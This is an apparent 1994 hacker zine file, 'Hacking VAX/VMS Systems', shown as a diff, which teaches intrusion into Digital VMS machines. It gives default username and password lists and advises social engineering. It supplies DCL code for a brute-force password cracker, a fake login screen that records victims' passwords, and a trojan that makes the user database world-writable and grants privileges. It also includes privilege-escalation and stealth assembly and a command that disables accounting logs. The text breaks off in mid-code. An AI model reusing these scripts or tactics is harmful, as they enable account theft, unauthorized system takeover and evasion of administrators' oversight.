@@ -1,0 +1,1617 @@
+                                    __
+                      \ /          |_
+                      / \ e n o n  |  o u n d a t i o n 
+                                
+                                 presents:
+                                  
+                                  \     /
+                      *------  the  \ /  
+                                    / \  files  ------*
+                                  /     \
+                
+                            January/1994  Issue: 7 
+               
+                / =-=-==-=-==-=-==-=-==-=-==-=-==-===-=-==-= \
+                |                                            |
+                \       --  Hacking VAX/VMS Systems  --      /
+                |                                            |
+                \                 Written by:                /
+                |                                            |
+                \                  Loxsmith                  /
+                |                                            |
+                \ =-=-==-=-==-=-==-=-==-=-==-=-==-===-=-==-= /                                     
+          
+
+
+
+
+I. Introduction
+
+        The VMS operating system used on Digital's VAX computers rivals UNIX 
+in power and versatility.  The VMS operating system is very easy to learn
+compared to some flavors of UNIX, and has a more sophisticated file security
+system than UNIX.  However, although the VMS operating system is, in my 
+opinion, one of the greatest operating systems available, its popularity is 
+rapidly declining.  From the outside, VMS can be one of the toughest
+operating systems to break into, or it can be relatively easy.  This all
+depends on how smart the system administrator is.  Internally, VMS has many
+holes, but none that can allow a normal user to become a privileged user.
+The operating system is virtually impossible to crack, and even with the use 
+of assembly language and kernel programming, you cannot get underneath the 
+operating system level.  
+
+
+II. Getting an Account
+
+        If you have ever come up with a scan for a VAX, you probably have
+realized that it is VERY difficult to get in from the outside. (Note: A
+VAX/VMS System is usually characterized by the "Username:" and "Password:"
+prompts.) This is so for two reasons: 1) VMS does not inform you if the
+account you are hacking exists or not and 2) Usually you get only three tries
+before you are terminated. If you do not already have an account on the
+system, things can get really tough. What I suggest doing is to try using the
+following list of common and default username and password combinations.
+Although, this will only work about 2% of the time with VMS V4.7 or above
+and 10% of the time with earlier versions, it may be the only shot that you
+have. The accounts are listed from most powerful to least powerful.
+
+Default and VERY Common Usernames and Passwords
+
+Name          Password                       Access
+------------------------------------------------------------------------------
+SYSTEM        SYSTEM, MANAGER or OPERATOR    (All privs.)
+FIELD         FIELD, SERVICE, or DIGITAL     (All privs.)
+SUPPORT       SUPPORT or DEC                 (All privs.)
+SYSMAINT      SYSLIB or SYSMAINT             (Usually all privs.)
+SYSTEST       UETP or SYSTEST                (All privs.)
+SYSTEST_CLIG  CLIG, SYSTEST, or TEST         (Usually a disabled user)
+DEFAULT       USER or DEFAULT                (Normal User)
+DECNET        DECNET, NETWORK, or DIGITAL    (Normal User) 
+OPERATIONS    OPERATIONS                     (Normal User)
+USER          USER                           (Normal User) 
+LIBRARY       LIBRARY or None                (Normal User)
+GUEST         GUEST or None                  (Normal User)
+DEMO          None                           (Normal User)
+HYTELNET      None                           (NETMBX)
+
+Common Usernames (note: try using the actual username as a password on these)
+
+VAX             VMS             DCL             DEC             TEST
+NETNONPRIV      NETPRIV         ORACLE          ALLIN1          INGRES
+GAMES           BACKUP          HOST            DIGITAL         AUDITLOG
+REMOTE          SAS             FAULT           USERP           VISITOR
+GEAC            VLSI            INFO            POSTMASTER      NET
+NETWORK         OPERATOR        OPER            MMPONY          PLUTO
+
+        If all of the defaults fail, you don't have too much of a choice as
+to what to do next.  If the system you are hacking is on an IP network such
+as the Internet, then you may want to finger the site, and get the names of
+users, and try to hack accounts with their first name, last name, common
+passwords, site name, and account name.  You may also try to social engineer
+yourself onto the system by bullshitting an employee or student of the
+business or school which owns the system into believing that you are a
+security manager taking a password survey.  You may also want to trash the
+site for info.  Any way you get in, you must get in.  This file will be
+useless to you if you do not have access to a system.
+
+
+III. The VMS Operating System Environment
+
+        VAX/VMS uses a command shell called DCL.  DCL is an acronym for Digital
+Command Language.  It is the fundamental batch language of VMS.  DCL can be
+referred to as a batch language because it resembles closely the batch
+language that MS-DOS uses for AUTOEXEC.BAT and other files.  However, DCL is
+much more powerful, and has much more commands, but it basically works the
+same way.  One difference is that when you want to execute a command within a
+DCL program, it must be preceded by a "$".  DCL programs usually have the
+file extension of .COM and can be executed by preceding the filename with the
+"@" symbol.  Some of the more popular commands that can be executed at the
+DCL command prompt or within a DCL program are listed below: (these commands
+have further parameters and qualifiers that you can specify.  These commands
+and qualifiers can be learned by browsing through a DCL manual or the online
+HELP.)
+
+@: Execute DCL .COM program.  When you want to run any DCL batch file, you will
+   include this "@" before the filename.
+   Example: to execute a DCL program called LOGIN.COM, you would type:
+                        $ @login
+
+ACCOUNTING: Allows you to view and edit system accounting data that keeps
+            track of what system time you have racked up.
+
+ANALYZE: Lets you view the contents of OBJ files in HEX/ASCII format.
+
+ANALYZE/SYSTEM: Invokes the SDA.  Allows you to view other running processes, 
+                their type-ahead buffers etc.
+
+APPEND: Appends the contents of file1 to file2.
+
+ATTACH: Allows you to attach yourself to one of your subprocesses.  For
+        example, if you spawned out a process LOXSMITH_1 from LOXSMITH and
+        you wanted to become LOXSMITH_1, you would type ATTACH LOXSMITH_1.
+
+CLOSE: Closes a file that was opened for input/output via OPEN.
+
+CONTINUE: Continue a process or the execution of an image or command language
+          file that you have aborted with control-Y or cancel.
+
+COPY: Copy file1 to file2.  You can specify full pathnames, with device and 
+      subdirectory.  If you want to copy it to your home directory just use 
+      sys$login as your 'TO' file.  Example: to copy HACKUNIX.DOC from 
+      [LOXSMITH] to [DATA], type:
+                        $ copy [loxsmith]hackunix.doc [data]
+
+CREATE: This will create a file a text file of any type.  It has no editing 
+        functions and is used best when uploading ASCII files from your system 
+        to the VAX system.  Example: to create a text file called CRIME.TXT, 
+        you would type:
+                        $ create crime.txt
+                        Hacking is computer crime.
+                        [Control-Z]
+
+CREATE/DIRECTORY: CREATE can also be used with the switch, /DIRECTORY, to
+                  make a subdirectory.  Example: to create a subdirectory 
+                  called hackstuf, you would type:
+                        $ create/directory [.hackstuf]
+
+DELETE: This will delete a file or a directory.  Remember always to specify a
+        version number when deleting a file.  Example: to delete a file 
+        called TAP-01.TXT, type:
+                        $ delete tap-01.txt;*
+        To delete a subdirectory called RULES, type:
+                        $ delete/log [.rules]*.*;*
+                        $ set protection = o:d rules.dir
+                        $ delete rules.dir;1
+
+DELETE/INTRUSION_RECORD: Deletes record of failed password attempts.
+
+DIFFERENCES: Compares two files and notifies you of their differences.
+
+DIRECTORY: This will show you a listing of all files in a specified directory.
+           Example: to show all files in the current directory, type:
+                        $ directory
+           To show all files in the HACKSTUF subdirectory, type:
+                        $ directory [.hackstuf]
+           DIRECTORY can also be used with a number of switches.  The most 
+           popular one being /FULL.  This shows complete security information 
+           on a file.  Example: to get information on a file called 
+           HACKUNIX.DOC in your directory, type:
+                        $ directory/full hackunix.doc
+
+DUMP: Get a hex/ASCII dump on a specified file.
+
+EDIT: This command will bring up the editor.  The editor will create standard
+      ASCII text files.  How to use the editor varies from system to system,
+      but generally, it should resemble the DOS editor.  On older versions of
+      VMS, it may be closer to DOS's EDLIN.  Example: to edit the pre-existing 
+      file, hackunix.doc, type:
+                        $ edit hackunix.doc
+
+EDIT/EDT: Invokes the VAX EDT interactive text editor. (VT100 Emulation)
+
+EXAMINE: View the contents of virtual memory.
+
+HELP: This command will bring up the HELP program. The VAX/VMS help facility
+      is extensive to say the least, and I learned most of what I know from it.
+      Example: to get help on the command, DELETE, type:
+                        $ help delete
+
+LINK: Link object files into EXE files that you can run.  Works on .OBJ files
+      only.
+
+LOGOUT: Logs you out of your current process. 
+
+MAIL: Executes the VAX/VMS E-Mail facility. It is used to send mail to other
+      others users and to read mail from other users.  Example: to mail a 
+      file called HACKUNIX.DOC to a user named SANCHEZ, type:
+                        $ mail hackunix.doc sanchez
+
+PHONE: Used to page another user or answer a page. Conversations are terminated
+       by pressing [Control-Z].  Example: to page a user named COLIVEIRA, type:
+                        $ phone coliveira
+       To answer a page, type:
+                        $ phone answer
+
+RENAME: Rename a file or directory.
+
+RUN: Executes image files. (runs files with the .EXE extension) Example: to 
+     run PASSWORD_HACKER.EXE, type:
+                        $ run password_hacker.exe
+
+SET/SHOW ACCOUNTING: Show or set the current security bells enabled.
+
+SET/SHOW AUDIT: Show auditing.  Auditing is different than security bells.
+
+SET CONTROL: Disables/enables interrupts via ctrl-Y/ctrl-C.
+
+SET/SHOW DEFAULT: Set or show directory path and device (disk drive)
+                  Example: to change directory to GAMES on disk DUA0:, 
+                  you would type:
+                        $ set default dua0:[games]
+                  To change to a subdirectory of the directory you are in
+                  called BBS, you would type:
+                        $ set default dua0:[.bbs]
+                  To show your current directory and device, you would type:
+                        $ show default
+
+SET HOST: Allows you to connect to another mainframe on the VAXCluster.  For
+          example, if SHOW NETWORK reveals that you are on a VAXCluster with
+          two other machines, MDCS1 and MDCS2, you could log yourself onto
+          MDCS1 by typing:
+                        $ set host mdcs1
+
+SHOW INTRUSION: View the contents of the breakin database.
+
+SHOW LOGICAL: Show current logical name assignments.  Useful for finding out
+              where information is stored on the system.
+
+SHOW NETWORK: Lists all the available nodes that you can connect to with the
+              SET HOST command.
+
+SET PASSWORD: Change the password of your account.
+
+SET/SHOW PROCESS: Change the characteristics of your process.  This will 
+                  display your username, and other information such as 
+                  protection, quota, date, time, and system.
+
+SET/SHOW PROCESS/PRIV: Shows or sets the privileges your process has enabled.
+                       For example, to grant yourself all privs, you would
+                       use the following command:
+                        $ set process/priv=all  
+                       Keep in mind that you must have the SETPRV privilege
+                       to grant yourself ALL privileges.
+
+SET PROMPT: Change the appearance of your prompt ($).
+
+SET/SHOW PROTECTION: One of the most frequent uses of the SET command is
+                     to change the protection attributes of a file or a
+                     directory.  These protections, UIC protections, can
+                     be put on any file or directory that you have WRITE
+                     and EXECUTE privileges to. This command is very
+                     powerful because it both restricts and allows users
+                     to read, write, execute, and delete your files or
+                     directories.  Example: to make TEST.EXE so that all you 
+                     can do is execute it, you would type:
+                        $ set protection = o:e test.exe
+                     To make TEST.EXE so that it can be deleted, read, and
+                     written to also, type:
+                        $ set protection = o:rwed test.exe
+                    RWED means that you can *R*ead, *W*rite, *E*xecute, and
+                    *D*elete the program.  The "o:" stood for *O*wner.  UIC 
+                    file protection can be implemented on any of the following:
+                        WORLD - Any user on the system.
+                        GROUP - Any user in your group.
+                        OWNER - Only your account or matching UIC.
+                        SYSTEM - System manager(s).
+
+SHOW SYSTEM: Shows all interactive and non-interactive processes on the system,
+             and their status.  For continuous information, use MONITOR PROC/ALL.
+
+SET/SHOW TERMINAL: Change or display your terminal characteristics.
+
+SHOW USERS - Gives you a listing of users online.  To show all users online 
+             and their ID's and terminals, type:
+                        $ show users/full
+             A listing such as the following should appear:
+
+                      VAX/VMS 5.4 users 23-JUL-1986 09:37:15.54
+             Total number of users = 4, Total number of processes = 5
+
+             Username      Process Name    PID  Terminal
+
+             SYSTEM        SYSTEM          0000012A  TTB0:
+             S14859JD      S14859JD        00000E12  TTC5:
+             S34123AL      S34123AL        0000020C  TTC0:
+             S34123AL      S34123AL_1      (subprocess of 0000020C)
+             HACKED        ACCOUNT         0000026A  TTC3:
+
+SPAWN: Spawn a subprocess.  Useful for multitasking.  For example, if you
+       wanted to run a program called HACKER in the background, and you
+       wanted all of the output to go to a printer called OPA0:, you would
+       type:
+                        $ spawn/nowait/output=OPA0: run hacker
+
+SUBMIT: Basically, the same as SPAWN.  However, SUBMIT can only run COM files
+        in the background.  The usefullness of SUBMIT is that even after you
+        log out of your account, the job you submitted will continue until
+        either you or a system administrator stops it.  Perfect for on-site
+        brute force hacking.  To submit a file to queue BA0: named HACK.COM,]
+        you would use:
+                        $ submit hack /queue=ba0:
+
+STOP: Kill off a subprocess.  For example, if you had all privileges, and you
+      wanted to kill a system administrator using the account SYSTEM, with
+      the process name of "SYSTEM", you would type:
+                        $ stop system
+
+TYPE: View an ASCII file.  Example: to list the contents of HACKUNIX.DOC, 
+      type:
+                        $ type hackunix.doc
+      To view the contents of a file, with a pause between pages, type:
+                        $ type hackunix.doc /page 
+
+A brief section on control sequences...  Several different actions can be 
+activated via control sequences. They are:
+
+CTRL-H: Delete last character
+CTRL-B: Redisplay last command (can go back up to the last 20 commands issued)
+CTRL-S: Pause display
+CTRL-Q: Continue after pause
+CTRL-Z: *EXIT* use to break out of things such as CREATE and EDIT
+CTRL-C: *CANCEL* will exit out of most operations
+CTRL-Y: *INTERRUPT* will break out of whatever you are doing
+CTRL-T: Print out statistical info about the process
+
+Sometimes upon login, the CTRL-Y, CTRL-C keys are disabled.  To ensure these 
+are enabled, issue this command upon login:
+
+$ set control = (t,y)
+
+      
+        The directory structure of VMS is similar to MS-DOS and UNIX.  It is an
+easy concept to grasp, so my review of it shall be brief and concise.  Each
+disk drive on the system is given a device name, much like a printer.  Often
+times the device names vary from system to system, however for this text, I
+will use the most common (and default) drive name, DUA0:.  DUA0: can also be
+known as SYS$SYSDEVICE:, and many other names through the use of VMS logicals.
+However, this is unimportant and should only be considered when you are
+searching all the drives on a system for a certain file.  Within each drive 
+there is a root directory.  This is the highest directory in the directory
+tree and is referenced by [000000].  Within the root there are several 
+subdirectories.  Within these subdirectories there may be files and even
+further subdirectories.  The concept is quite simple, but can be difficult to
+explain.  Here is a diagram to give you a rough idea of how it is set up:
+
+                                  [000000] <--root directory
+                                     !
+                                     !
+          +--------------------------+---------------------------------+
+          !                          !                                 !
+          !                          !                                 !
+        [d1]                       [d2]                              [d3]
+          !                          !                                 !
+    +-----+--------+           +-----+-----+                  +--------+
+    !     !        !           !           !                  !        !
+    !     !        !           !           !              [d3.d3a]  [d3.d3b]
+ [d1.da] [d1.db] [d1.dc]    [d2.d2a]   [d2.d2b]
+            !                  !           !
+            !                  !        +--+-----------+
+       [d1.db.db1]        [d2.d2a.d2a1] !              !
+                                       [d2.d2b.d2b1] [d2.d2b.d2b2]
+
+Note that to switch directories, you may use the SET DEFAULT command.  For
+example, if you are in the root directory, and if you wanted to access the
+[d1.db.db1] directory, you would type:
+
+$ set default [d1.db.db1]
+
+Within each subdirectory there will be other files also. For example to see 
+the directory after you log in you would type:
+
+$ directory
+
+this may result in something similar to the following:
+
+Directory SYS$SYSDEVICE:[COTE.DATA]
+
+LOGIN.COM;1         MAIL.MAI;1         VIEW.BAS;1         VIEW.BAS;2
+VIEW.EXE;2          VIEW.OBJ;1
+
+Total 6 files.
+
+The first line tells you what drive and subdirectory you are in. The next 
+lines are the actual files.  Each file has a 3 character extension, followed by 
+a comma and a number.  The name before the period is the actual filename; the 
+3 characters after the period is known as the extension; and the number after 
+the comma refers to the version of the file.  
+
+Some of the more important extensions are:
+
+Type      Description
+
+EXE       Executable IMAGE. These files are programs that can be RUN.
+COM       DCL SCRIPT files. These can also be executed, utilizing the @ 
+          command.
+DAT       DATA file.  Sometimes useful things to look at.  Most of the time
+          will be unreadable thanks to control characters.
+MAI       Mail file,  use the MAIL command to read these.
+DIR       DIRECTORY - not a file.
+JOU       Journal File, often created thru the use of other programs.  These
+          files are usually empty and worthless.
+TXT       Text files, often hold useful information.
+
+To get a listing of all the files on the whole drive, you would use this:
+
+$ set default [000000]
+$ directory [...]*.*
+
+Similarly you type dir [...]*.com, if you wanted just the COM files listed.
+To see the contents of a file, you can use the TYPE command. For example:
+
+$ type login.com
+
+you may see something similar to this:
+
+$ ! This is my LOGIN.COM file
+$ set control = (t,y)
+$ esc[0,7] == %d27
+$ wr :== write sys$output
+$ wr esc,"[H",esc,"[J"
+$ wr "Enter at your own risk..."
+$ wr " "
+$ set prompt = ":-) "
+$ exit
+
+Many times I have found user/passwords lying around in TXT, COM, and MAI files 
+left by some careless user.
+
+
+IV. Getting a Higher Privileged Account if you Have a Normal One
+
+         A normal user usually has the default privileges which are NETMBX
+and TMPMBX.  Privileges restrict various operations to those users who have 
+the privileges associated with the operations.  The following table lists the
+privileges and the operations they permit.
+   
+   +-----------+----------------------------------------------+
+   | Privilege |             Operations Permitted             |
+   +-----------+----------------------------------------------+
+   +-----------+----------------------------------------------+
+   | ACNT      | Create a process or subprocess with          |
+   |           | accounting disabled (RUN command and         |
+   |           | SYS$CREPRC system service)                   |
+   +-----------+----------------------------------------------+
+   | ALLSPOOL  | Allocate a spooled device (ALLOCATE command  |
+   |           | and SYS$ALLOC system service)                |
+   +-----------+----------------------------------------------+
+   | ALTPRI    | Increase base priority and create processes  |
+   |           | with higher priorities (SYS$SETPRI and       |
+   |           | SYS$CREPRC system services)                  |
+   +-----------+----------------------------------------------+
+   | BUGCHK    | Make BUGCHK error log entries                |
+   +-----------+----------------------------------------------+
+   | BYPASS    | Access all files bypassing file protection   |
+   +-----------+----------------------------------------------+
+   | CMEXEC    | Change mode to executive (SYS$CMEXEC system  |
+   |           | service)                                     |
+   +-----------+----------------------------------------------+
+   | CMKRNL    | Change mode to kernel (SYS$CMKRNL system     |
+   |           | service)                                     |
+   +-----------+----------------------------------------------+
+   | DETACH    | Create a detached process (SYS$CREPRC system |
+   |           | service)                                     |
+   +-----------+----------------------------------------------+
+   | DIAGNOSE  | Run online diagnostic programs and read      |
+   |           | messages written to the error log file       |
+   +-----------+----------------------------------------------+
+   | EXQUOTA   | Exceed disk quotas                           |
+   +-----------+----------------------------------------------+
+   | GROUP     | Affect other processes in the same group     |
+   |           | (SET QUEUE, DELETE/ENTRY, STOP/ENTRY, and    |
+   |           | SET PROCESS commands; SYS$SUSPND,            |
+   |           | SYS$RESUME, SYS$DELPRC, SYS$SETPRI,          |
+   |           | SYS$WAKE, SYS$SCHDWK, SYS$CANWAK,            |
+   |           | SYS$FORCEX, and SYS$GETJPI system            |
+   |           | services)                                    |
+   +-----------+----------------------------------------------+
+   | GRPNAM    | Create and delete group logical names        |
+   |           | (DEFINE, DEASSIGN, and MOUNT commands;       |
+   |           | SYS$CRELOG and SYS$DELLOG system services)   |
+   +-----------+----------------------------------------------+
+   | GRPPRV    | Access protected files and other objects     |
+   |           | within the same group as a system user, and  |
+   |           | change the protection on files and other     |
+   |           | objects within the same group                |
+   +-----------+----------------------------------------------+
+   | LOG_IO    | Perform logical I/O operations (SYS$QIO      |
+   |           | system service)                              |
+   +-----------+----------------------------------------------+
+   | MOUNT     | Mount volumes (SYS$QIO system service)       |
+   +-----------+----------------------------------------------+
+   | NETMBX    | Perform DECnet operations                    |
+   +-----------+----------------------------------------------+
+   | OPER      | Set devices spooled, control queues, control |
+   |           | public volumes, broadcast messages, and      |
+   |           | perform other system-wide operations         |
+   +-----------+----------------------------------------------+
+   | PFNMAP    | Map to physical memory and I/O registers     |
+   +-----------+----------------------------------------------+
+   | PHY_IO    | Perform physical I/O operations (SYS$QIO     |
+   |           | system service)                              |
+   +-----------+----------------------------------------------+
+   | PRMCEB    | Create and delete permanent common event     |
+   |           | flag clusters (SYS$ASCEFC and SYS$DLCEFC     |
+   |           | system services)                             |
+   +-----------+----------------------------------------------+
+   | PRMGBL    | Create global sections (SYS$CRMPSC system    |
+   |           | service) and install global sections (also   |
+   |           | requires CMKRNL and SYSGBL privileges)       |
+   +-----------+----------------------------------------------+
+   | PRMMBX    | Create and delete permanent mailboxes        |
+   |           | (SYS$CREMBX and SYS$DELMBX system            |
+   |           | services)                                    |
+   +-----------+----------------------------------------------+
+   | PSWAPM    | Disable and enable swapping (RUN command;    |
+   |           | SYS$CREPRC and SYS$SETSWM system services)   |
+   +-----------+----------------------------------------------+
+   | READALL   | Allow read and control access to all objects |
+   +-----------+----------------------------------------------+
+   | SECURITY  | Perform security-related activities such as  |
+   |           | enabling or disabling security audits and    |
+   |           | setting the system password                  |
+   +-----------+----------------------------------------------+
+   | SETPRV    | Give higher privileges to other processes    |
+   +-----------+----------------------------------------------+
+   | SHARE     | Assign a channel to a device even if the     |
+   |           | channel is allocated to another device       |
+   +-----------+----------------------------------------------+
+   | SHMEM     | Create global sections and mailboxes in      |
+   |           | multiport memory (also requires the          |
+   |           | appropriate PRMGBL, PRMMBX, SYSGBL, and      |
+   |           | TMPMBX privileges)                           |
+   +-----------+----------------------------------------------+
+   | SYSGBL    | Create system global sections (SYS$CRMPSC)   |
+   |           | and install known images (also requires      |
+   |           | CMKRNL and PRMGBL privileges)                |
+   +-----------+----------------------------------------------+
+   | SYSLCK    | Lock system-wide resources (SYS$ENQ system   |
+   |           | service)                                     |
+   +-----------+----------------------------------------------+
+   | SYSNAM    | Create and delete system logical names       |
+   |           | (DEFINE, DEASSIGN, and MOUNT commands;       |
+   |           | SYS$CRELOG and SYS$DELLOG system services)   |
+   +-----------+----------------------------------------------+
+   | SYSPRV    | Access protected files and other objects as  |
+   |           | a system user, and change the protection on  |
+   |           | files and other objects                      |
+   +-----------+----------------------------------------------+
+   | TMPMBX    | Create temporary mailboxes (SYS$CREMBX       |
+   |           | system service)                              |
+   +-----------+----------------------------------------------+
+   | VOLPRO    | Initialize a volume with a different UIC,    |
+   |           | override an expiration date, mount a volume  |
+   |           | foreign, and override volume protection      |
+   |           | (affecting system volumes also requires      |
+   |           | SYSNAM privilege)                            |
+   +-----------+----------------------------------------------+
+   | WORLD     | Affect all other processes (SET QUEUE,       |
+   |           | DELETE/ENTRY, STOP/ENTRY, and SET PROCESS    |
+   |           | commands; SYS$SUSPND, SYS$RESUME,            |
+   |           | SYS$DELPRC, SYS$SETPRI, SYS$WAKE,            |
+   |           | SYS$SCHDWK, SYS$CANWAK, SYS$FORCEX, and      |
+   |           | SYS$GETJPI system services)                  |
+   +-----------+----------------------------------------------+
+
+        Once you are inside the system, there really is no way to directly
+pull files off of the disk drive and change user information unless you have
+an account with high access. A high access account is an account with one,
+some, or all of the following privileges: SYSPRV, BYPASS, SETPRV, and/or
+SECURITY. If you already have an account such as this, I suggest you skip
+this section. If you don't, hang in there, because in no time you should have
+system administrator access.
+
+        The first thing you should do is get a list of all of the accounts on
+the system. This is useful because you can spot unpassworded accounts that
+you may be able to spawn out from and you can also spot accounts that have
+not yet been used and are recently created. The default passwords for such
+accounts are USER, NEWUSER, and the actual account name.  To get a list of 
+all of the accounts on the system, type the following from DCL:
+
+        $ type sys$system:rightslist.dat
+
+You should either capture or download this file.  There will be a lot of random
+characters mixed in, but the account names are easily readable.  This is very
+useful. Basically, find out which ones are not being used.  For example, some
+system administrators may create 30 accounts for a FORTRAN class, and he may
+name the accounts FORTRAN1-FORTRAN30.  Now let's say that only 21 people sign
+up for the course.  That means FORTRAN22-FORTRAN30 are free for you to take
+with the aforementioned passwords, USER or NEWUSER.  I would also try the actual
+username for a password. (ex: Username: FORTRAN22, Password: FORTRAN22)  I have
+actually encountered a few accounts like this with privileges.  It depends on
+how stupid the people that you are dealing with are.  The more accounts that
+you are able to acquire, the better chance you will have at surviving on the
+system.  So, try to grab as many as you possibly can, even if they are not
+high privileged.                                                          
+
+        One of the sloppiest, but effective ways, to hack is brute force
+password hacking.  Brute force hacking is simple.  It basically means to plug
+in random passwords into someone's account until you finally hit.  A simple
+brute-force password hacker can be made on your home computer.  All you have
+to do is construct a program that dials up your target and reads words 
+sequentially out of dictionary and plugs them into the usernames.  This can 
+be a long, hard process, but it works.  A simpler brute force hacker could
+be created with VMS's batch language, DCL.  You could submit the hacker into
+the batch queue and not have to worry about it hindering your personal
+hacking time.  The code to a simple hacker follows:
+
+$!Brute force password hacker by Loxsmith
+$ open/read io1 dictionary.txt
+$ again:
+$ open/write io2 hack.com
+$ write io2 "$ SET HOST 0"
+$ write io2 'P1'
+$ read io1 pass
+$ write io2 pass
+$ write io2 'P1'
+$ read io1 pass
+$ write io2 pass
+$ write io2 'P1'
+$ read io1 pass
+$ write io2 pass
+$ close io2
+$ @hack
+$ goto again
+
+This program will open up a file called dictionary.txt (providing that it
+is in your current directory) and read in passwords one line at a time while
+plugging them in under a specified username.  For example, (assuming the
+name of this program is hacker.com) if you wanted to hack the account SYSTEM
+with the dictionary in your account, you would type:
+
+$ submit hacker system /queue=ba0:
+
+Another way to hack within the system is issuing the following command: 
+
+$ dir <node>"<username> <password>"::
+
+If the password is wrong, DCL will report a user authorization error.  If the
+password is correct, DCL will complain about an ACP protection error.  Either
+way, your attempt is not recorded by VMS unless the system you are working
+on has excellent auditing, and the administrator constantly watches the logs.
+
+        A better way than brute force hacking is a password grabber.  A password
+grabber does precisely what it says, it grabs passwords.  When you log off, the
+password grabber will sit there and pretend to be the login sequence (Username
+and Password prompts), but it really will record the username and the password
+entered into a file in your account and give the unfortunate user a "User
+Authorization Failure" error message.  This is a very effective way of snatching
+passwords, but also is very dangerous.  The following listing is a short password
+grabber for VAX/VMS.  It is written in DCL, so even the absolute beginner
+should understand how it works.
+
+$!VAX/VMS Password Grabber by Loxsmith
+$!Name it QUIT.COM
+$ wr :== write sys$output
+$ time = f$time()
+$!Replace <username> with your username.
+$ wr "<username>   logged off at ",time
+$ set term/nobroadcast
+$ set noon
+$ set nocontrol = (t,y)
+$!Edit the following message to whatever welcome message your target system has.
+$ wr "     Welcome to VAX/VMS 5.5"
+$ wr " "
+$ ak:
+$ inquire uname "Username"
+$ if uname .eqs. "" then goto ak
+$ set term/noecho
+$ inquire pass "Password"
+$ set term/echo
+$ open/write pw_file pass.txt
+$ write pw_file "Username: ",uname
+$ write pw_file "Password: ",pass
+$ close pw_file
+$ wr "User Authorization Failure"
+$ stop "''f$process()
+
+Replace <username> in line 5 with the account that you are currently
+inhabiting. Now, one more change is necessary. You must edit the LOGIN.COM
+file. (I will assume that you are not running the password grabber out of
+your own account. If you do, only do it once, and that is to get another
+account to run it out of.) If the person doesn't already have a LOGIN.COM file, don't sweat
+it, you will just make a new one. Regardless of if you do this or not, the
+last two lines of the program should look like this:
+
+$ log :== @quit
+$ dir :== dir/exclude = (quit.com, login.com, pass.txt)
+
+Omit the login.com in line 2 if the person already has a LOGIN.COM in their
+account.
+
+        OK, there you have it. A password grabber. Check the person's account
+daily (or your account, depending on who the person is there on-site). The
+passwords are stored in a file called PASS.TXT. To look at all passwords
+acquired, type the following line:
+
+$ type pass.txt;*
+
+Sooner or later, you should find at least one privileged account in there.
+Also, you must repeat this process to every account you can get for the
+fastest results. You can quite simply add the following command into your
+QUIT.COM file to mail new passwords to your main account as soon as you
+get them:
+
+$ mail pass.txt <your account>
+
+Yet another way to gain privileges from inside a VMS is to use kernel
+manipulation.  Unfortunately to do this, you must already have the CMEXEC
+privilege.  This is not a very powerful privilege, but very rarely does
+a system administrator give it away.  After you upload this program or
+type it in, use the following commands to activate it:
+
+$ MACRO EXEC        <assuming you have saved this file as EXEC.MAR>
+$ LINK EXEC,SYS$SYSTEM:STSDEF.STB
+$ RUN EXEC
+
+; exec.mar:
+
+           .TITLE     GET_PRIVS
+MASK:      .QUAD      ^XFFFFFFFFFFFFFFFF
+           .ENTRY     GET_PRIVS, ^M<>
+           $CMEXEC_S  ROUTIN=SETEM
+           $EXIT_S    #1
+SETEM:     $SETPRV_S  PRMFLG=#1, -
+                      ENBFLG=#1, -
+                      PRVADR=MASK
+           RET
+           .END       GET_PRIVS
+
+One last way to obtain privileges is through the use of a trojan horse.  If
+you can somehow get a privileged user to run the following program, it would
+grant NAME, ALL privileges, and it would unprotect the SYSUAF.DAT and
+AUTHORIZE.EXE programs.
+
+$ pre_prvs=f$setprv("setprv")
+$ if f$privilege("setprv") then goto do_damage
+$ exit
+$ do_damage:
+$ set prot sys$system:sysuaf.dat/prot=(w:rwed)
+$ set prot sys$system:authorize.exe/prot=(w:rwed)
+$ pre_prvs=f$setprv(pre_prvs)
+$ open/write file sys$scratch:adduaf.tmp
+$ write file "$ RUN SYS$SYSTEM:AUTHORIZE"
+$ write file "MODIFY NAME/PRIV=SETPRV"
+$ close file
+$ @sys$scratch:adduaf.tmp/output=sys$scratch:adduaf.dat
+$ del sys$scratch:adduaf.*;*
+$ exit
+
+
+V. What to Hack
+
+        Once you get on with a higher privileged account, I suggest you take
+as many privileges as you can. To accomplish this, type:
+
+        $ set process/priv=all
+
+You may get an error saying that you don't have enough privileges to do it.
+In this case, go to the trusty password grabber and continuously try to get
+an account with higher privileges.  If you can't, then you aren't trying
+hard enough.  I have not encountered a VMS system to this day that I haven't
+been able to obtain higher access on if I have a normal account.  The next 
+thing you want to do is be sure that the system is not recording you.  To 
+accomplish this, type:
+
+        $ set accounting/disable
+
+Now you should be kept off of the logs. If you feel it is necessary to be
+sure, the system log file is sys$manager:accounting.dat. You should
+now look to see who else is on with you. To do this, type:
+
+        $ show users/full
+
+                VAX/VMS 5.4 users 23-JUL-1986 09:37:15.54
+        Total number of users = 4, Total number of processes = 5
+
+             Username      Process Name    PID  Terminal
+
+             SYSTEM        SYSTEM          0000012A  TTB0:
+             S14859JD      S14859JD        00000E12  TTC5:
+             S15124AL      S34123AL        0000020C  TTC0:
+             S15124AL      S34123AL_1      (subprocess of 0000020C)
+             HACKED        ACCOUNT         0000026A  TTC3:
+
+
+I suggest that if SYSTEM is on, that you log off immediately and call back
+later or use the following MACRO-32 program (INVI.MAR) stolen from Bruce  
+Ellis.  What INVI.MAR does is hide you from SHOW USERS and FINGER.  It
+accomplishes this by making your process non-interactive and then renaming 
+your process name to a printer driver.  The code follows:
+
+        .TITLE  Invisible       - Stealth and Unstealth mixed together
+        .IDENT  /V02.000/
+
+; Environment:
+;
+;       VAX/VMS native mode, VMS V5.0 or later, resident, kernel mode,
+;       CMKRNL privilege required.
+;
+
+        .library "sys$library:lib.mlb"  ; Get $nnnDEFs
+        .link    "sys$system:sys.stb"-  ; Get offsets
+                 /selective_search
+        $jibdef         ; Job Information Block offsets
+        $lnmdef         ; Logical Name symbol definitions
+        $pcbdef         ; Process Control Block offsets
+        $psldef         ; Processor Status Longword offsets and definitions
+        $ssdef          ; System Status codes
+;
+; Define structures for storing old process information
+;
+
+
+$DEFINI ISB                     ; _Invisible_ Storage Block
+$DEF    ISB$L_UIC       .BLKL 1 ; Process User Identification Code
+$DEF    ISB$B_TERMINAL  .BLKL 1 ; Terminal Name length
+$DEF    ISB$B_JOBTYPE   .BLKL 1 ; Job Type (from JIB)
+$DEF    ISB$L_NAMELEN   .BLKL 1 ; Length of process name
+$DEF    ISB$T_LNAME     .BLKB - ; Process name
+                        <PCB$S_LNAME>
